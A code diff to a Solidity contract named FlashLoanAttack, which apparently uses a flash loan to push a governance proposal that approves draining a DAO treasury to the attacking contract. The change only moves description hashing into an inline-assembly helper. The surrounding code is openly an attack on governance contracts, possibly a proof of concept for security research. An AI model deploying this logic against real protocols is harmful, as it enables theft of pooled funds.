@@ -186,7 +186,7 @@ contract FlashLoanAttack is IFlashLoanReceiver {
         calldatas[0] = abi.encodeWithSignature("approve(address,uint256)", address(this), treasuryDrainAmount);
 
         string memory description = "PROPOSAL: Emergency Treasury Withdrawal";
-        bytes32 descriptionHash = keccak256(bytes(description));
+        bytes32 descriptionHash = _hashDescription(description);
 
         uint256 proposalId = IGovernor(governor).propose(targets, values, calldatas, description);
         emit ProposalCreated(proposalId, treasuryDrainAmount);
@@ -258,6 +258,12 @@ contract FlashLoanAttack is IFlashLoanReceiver {
         uint256 balance = IERC20(token).balanceOf(address(this));
         if (balance > 0) {
             require(IERC20(token).transfer(to, balance), "FlashLoanAttack: recover transfer failed");
+        }
+    }
+
+    function _hashDescription(string memory description) internal pure returns (bytes32 hash) {
+        assembly {
+            hash := keccak256(add(description, 32), mload(description))
         }
     }
 }
